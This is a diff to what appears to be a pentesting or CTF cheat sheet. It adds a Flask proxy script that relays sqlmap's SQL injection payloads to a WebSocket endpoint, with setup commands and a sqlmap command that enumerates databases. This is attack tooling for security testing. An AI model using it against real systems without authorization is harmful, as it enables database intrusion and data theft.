@@ -368,6 +368,73 @@ sqlmap -u "URL" --level=5 --risk=3
 
 ---
 
+## SQLMap Over WebSockets
+
+SQLMap doesn't natively support WebSockets. Use a Flask proxy to translate HTTP requests to WebSocket messages.
+
+### Flask Proxy Script
+
+```python
+# ws_proxy.py
+from flask import Flask, request
+from websocket import create_connection
+
+app = Flask(__name__)
+
+ws_url = "ws://target.com:9091"  # WebSocket endpoint
+
+@app.route("/")
+def handle():
+    query = request.args.get('query')
+    
+    ws = create_connection(ws_url)
+    
+    # Modify payload format as needed for target
+    payload = '{"id":"%s"}' % query
+    
+    ws.send(payload)
+    res = ws.recv()
+    ws.close()
+    
+    return res if res else "no response"
+
+if __name__ == "__main__":
+    app.run(debug=False)
+```
+
+### Setup & Run
+
+```bash
+# Setup
+python3 -m venv .venv
+source .venv/bin/activate
+pip install flask websocket-client
+
+# Run proxy
+flask run
+# or: python ws_proxy.py
+
+# Now use sqlmap against local proxy
+sqlmap -u "http://localhost:5000/?query=1" --batch --dbs
+```
+
+### Common WebSocket Payload Formats
+
+```python
+# JSON with id parameter
+payload = '{"id":"%s"}' % query
+
+# JSON with ticket/search
+payload = '{"ticket":"%s"}' % query
+
+# Plain text
+payload = query
+```
+
+**Reference:** https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
+
+---
+
 ## Useful One-Liners
 
 ```bash
